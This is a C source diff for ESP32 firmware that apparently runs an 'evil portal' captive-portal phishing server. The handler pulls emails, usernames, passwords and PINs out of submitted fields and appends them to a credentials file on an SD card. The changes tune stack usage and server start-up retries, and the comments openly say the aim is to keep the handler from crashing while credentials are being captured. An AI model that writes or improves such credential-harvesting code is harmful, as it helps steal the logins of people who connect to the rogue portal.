@@ -1608,30 +1608,35 @@ esp_err_t get_info_handler(httpd_req_t *req) {
     }
 
     if (query[0] != '\0') {
-        // Extract known fields first
-        char val_buf[128] = {0};
-        if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
-            url_decode(decoded_email, val_buf);
-        }
-        if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
-            url_decode(decoded_password, val_buf);
-        }
-        // Also try common alternative field names
-        if (decoded_email[0] == '\0') {
-            const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
-            for (int i = 0; email_keys[i] != NULL; i++) {
-                if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
-                    url_decode(decoded_email, val_buf);
-                    if (decoded_email[0] != '\0') break;
+        // Extract known fields first.  Scoped so val_buf's stack slot is free
+        // for reuse below -- this handler runs close to the httpd worker's
+        // stack limit (same class of issue as the dns_server.c sinkhole/
+        // portal split).
+        {
+            char val_buf[128] = {0};
+            if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
+                url_decode(decoded_email, val_buf);
+            }
+            if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
+                url_decode(decoded_password, val_buf);
+            }
+            // Also try common alternative field names
+            if (decoded_email[0] == '\0') {
+                const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
+                for (int i = 0; email_keys[i] != NULL; i++) {
+                    if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                        url_decode(decoded_email, val_buf);
+                        if (decoded_email[0] != '\0') break;
+                    }
                 }
             }
-        }
-        if (decoded_password[0] == '\0') {
-            const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
-            for (int i = 0; pass_keys[i] != NULL; i++) {
-                if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
-                    url_decode(decoded_password, val_buf);
-                    if (decoded_password[0] != '\0') break;
+            if (decoded_password[0] == '\0') {
+                const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
+                for (int i = 0; pass_keys[i] != NULL; i++) {
+                    if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                        url_decode(decoded_password, val_buf);
+                        if (decoded_password[0] != '\0') break;
+                    }
                 }
             }
         }
@@ -1669,17 +1674,21 @@ esp_err_t get_info_handler(httpd_req_t *req) {
             p = amp ? amp + 1 : p + strlen(p);
         }
 
-        // Write to credentials file
+        // Write to credentials file.  `query` is dead past this point (the
+        // dump loop above was its last reader), so reuse its storage instead
+        // of a fresh 512-byte `line` array -- keeps this handler's frame
+        // smaller on the httpd worker's tight stack.
         if (current_creds_filename[0] != '\0') {
-            char line[512];
+            char *line = query;
+            const size_t line_sz = sizeof(query);  // `line` is a pointer now; sizeof(line) would be wrong
             int n;
             if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
-                n = snprintf(line, sizeof(line), "Email: %s, Password: %s | All: %s\n",
+                n = snprintf(line, line_sz, "Email: %s, Password: %s | All: %s\n",
                              decoded_email, decoded_password, all_fields);
             } else {
-                n = snprintf(line, sizeof(line), "Fields: %s\n", all_fields);
+                n = snprintf(line, line_sz, "Fields: %s\n", all_fields);
             }
-            if (n > 0 && (size_t)n < sizeof(line)) {
+            if (n > 0 && (size_t)n < line_sz) {
                 if (!require_jit) {
                     if (sd_card_manager.is_initialized) {
                         FILE *f = fopen(current_creds_filename, "a");
@@ -1862,7 +1871,11 @@ httpd_handle_t start_portal_webserver(void) {
     // ctrl_port must be unique across all httpd instances (ap_manager uses 32768)
     config.ctrl_port = 32769;
     config.lru_purge_enable = true;
-    config.stack_size = 4096;
+    // get_info_handler (credential capture) walks query/body parsing plus a
+    // direct fopen/fwrite/fclose on non-JIT boards; 4096 left too little
+    // headroom and could overflow the httpd worker stack right as creds were
+    // captured. Start a bit larger and only shrink if RAM forces it.
+    config.stack_size = 5120;
     // Short socket timeouts so a flooded or stalled client cannot pin a socket
     // for long.  These apply to the portal server only.
     config.recv_wait_timeout = 3;
@@ -1878,10 +1891,10 @@ httpd_handle_t start_portal_webserver(void) {
         config.ctrl_port = 32769 + ctrl_try;
         ret = httpd_start(&evilportal_server, &config);
 
-        if (ret == ESP_ERR_HTTPD_TASK && config.stack_size > 3072) {
+        while (ret == ESP_ERR_HTTPD_TASK && config.stack_size > 3072) {
             ESP_LOGW(TAG, "portal httpd_start failed with ESP_ERR_HTTPD_TASK, retrying with smaller stack");
             portal_log_heap_caps("start_failed_httpd_task");
-            config.stack_size = 3072;
+            config.stack_size = (config.stack_size > 4096) ? 4096 : 3072;
             vTaskDelay(pdMS_TO_TICKS(50));
             ret = httpd_start(&evilportal_server, &config);
         }
